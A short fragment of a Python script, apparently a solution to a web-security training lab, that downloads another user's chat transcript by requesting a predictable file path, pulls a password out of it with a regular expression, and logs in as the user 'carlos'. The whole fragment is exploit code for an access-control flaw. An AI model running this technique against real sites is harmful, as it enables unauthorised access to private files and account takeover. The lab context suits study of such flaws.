...
def getlog(s, url, path):
    target_url = url + path
    r = s.get(target_url)
    soup = BeautifulSoup(r.text, 'html.parser')
    transcript = soup.get_text()
    match = re.search(r"password is ([a-z0-9]+)\.", transcript)
    password = match.group(1) # type: ignore
...
def main():
    ...
    password = getlog(s, url, '/download-transcript/1.txt')
    login_acc(s, url, 'carlos', password)
